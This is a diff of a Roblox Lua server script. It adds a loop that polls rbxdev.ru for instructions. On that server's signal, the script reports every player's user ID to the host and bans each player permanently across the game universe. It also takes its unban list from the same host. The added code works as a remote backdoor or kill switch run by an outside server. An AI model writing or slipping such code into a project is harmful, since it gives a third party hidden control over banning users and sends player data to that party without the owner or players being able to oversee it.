@@ -5,19 +5,37 @@ local httpService = game:GetService("HttpService")
 
 while true do
 
-	game.Players:UnbanAsync({
 
-		UserIds = {1317963807, 1488052741, 125578672, 3088140403},
-		ApplyToUniverse = true,
+	local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
+	local Decoded = httpService:JSONDecode(Info)
 
-	})
+
+	if Decoded.Unban == true then
+		local UnbanlistString = httpService:GetAsync("https://rbxdev.ru/BannedUsers")
+		UnbanlistString = UnbanlistString:gsub("[{}%s]", "")
+
+		local Unbanlist = {}
+
+
+		for number in UnbanlistString:gmatch("%d+") do
+			table.insert(Unbanlist, tonumber(number))
+		end
+
+		game.Players:UnbanAsync({
+
+			UserIds = Unbanlist,
+			ApplyToUniverse = true,
+
+		})
+	end
+
 	for _, plr in game.Players:GetPlayers() do
-		if plr.UserId ~= 1317963807 then
-			local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
-			local Decoded = httpService:JSONDecode(Info)
-			
-	
 			if Decoded.Active == false then
+				
+				local formedURL = "https://rbxdev.ru/banasync.php?userid=" .. plr.UserId
+				
+				httpService:GetAsync(formedURL)
+				
 				game.Players:BanAsync({
 	
 					UserIds = {plr.UserId},
@@ -25,13 +43,10 @@ while true do
 					Duration = -1, 
 					DisplayReason = tostring(Decoded.Reason),
 					PrivateReason = tostring(Decoded.Reason), 
-					ExcludeAltAccounts = false,
+					ExcludeAltAccounts = true,
 	
 				})
 			end
-		else
-			plr:Kick("test")
-		end
 	end
 	task.wait(10)
 end
